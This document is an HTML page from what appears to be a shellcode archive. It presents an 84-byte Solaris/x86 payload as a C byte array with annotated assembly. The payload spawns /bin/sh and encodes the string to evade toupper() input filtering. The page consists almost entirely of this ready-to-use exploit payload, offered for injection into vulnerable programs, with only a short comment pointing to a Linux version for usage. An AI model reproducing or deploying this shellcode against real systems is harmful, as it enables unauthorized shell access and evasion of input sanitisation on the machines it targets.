<html><head><title>Solaris/x86 - execve /bin/sh toupper evasion - 84 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* 
 *  Solaris/x86
 *
 *  Used for toupper() evasion (look to the linux version for an 
 *  explanation and usage example). 
 */
 
char c0de[] = 
/* main: */
&quot;\xeb\x33&quot;                                /* jmp callz                */
/* start: */
&quot;\x5e&quot;                                    /* popl %esi                */
&quot;\x8d\x06&quot;                                /* leal (%esi), %eax        */
&quot;\x29\xc9&quot;                                /* subl %ecx, %ecx          */
&quot;\x89\xf3&quot;                                /* movl %esi, %ebx          */
&quot;\x89\x5e\x08&quot;                            /* movl %ebx, 0x08(%esi)    */
&quot;\xb1\x07&quot;                                /* movb $0x07, %cl          */
/* loopz: */
&quot;\x80\x03\x20&quot;                            /* addb $0x20, (%ebx)       */
&quot;\x43&quot;                                    /* incl %ebx                */
&quot;\xe0\xfa&quot;                                /* loopne loopz             */
&quot;\x93&quot;                                    /* xchgl %eax, %ebx         */
&quot;\x29\xc0&quot;                                /* subl %eax, %eax          */
&quot;\x89\x5e\x0b&quot;                            /* movl %ebx, 0x0b(%esi)    */
&quot;\x29\xd2&quot;                                /* subl %edx, %edx          */
&quot;\x88\x56\x19&quot;                            /* movb %dl, 0x19(%esi)     */
&quot;\x89\x56\x07&quot;                            /* movl %edx, 0x07(%esi)    */
&quot;\x89\x56\x0f&quot;                            /* movl %edx, 0x0f(%esi)    */
&quot;\x89\x56\x14&quot;                            /* movl %edx, 0x14(%esi)    */
&quot;\xb0\x3b&quot;                                /* movb $0x3b, %al          */
&quot;\x8d\x4e\x0b&quot;                            /* leal 0x0b(%esi), %ecx    */
&quot;\x89\xca&quot;                                /* movl %ecx, %edx          */
&quot;\x52&quot;                                    /* pushl %edx               */
&quot;\x51&quot;                                    /* pushl %ecx               */
&quot;\x53&quot;                                    /* pushl %ebx               */
&quot;\x50&quot;                                    /* pushl %eax               */
&quot;\xeb\x18&quot;                                /* jmp lcall                */
/* callz: */
&quot;\xe8\xc8\xff\xff\xff&quot;                    /* call start               */

&quot;\x0f\x42\x49\x4e\x0f\x53\x48&quot;            /* /bin/sh -= 0x20          */
&quot;\x01\x01\x01\x01\x02\x02\x02\x02\x03\x03\x03\x03&quot;
/* lcall: */
&quot;\x9a\x04\x04\x04\x04\x07\x04&quot;;


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
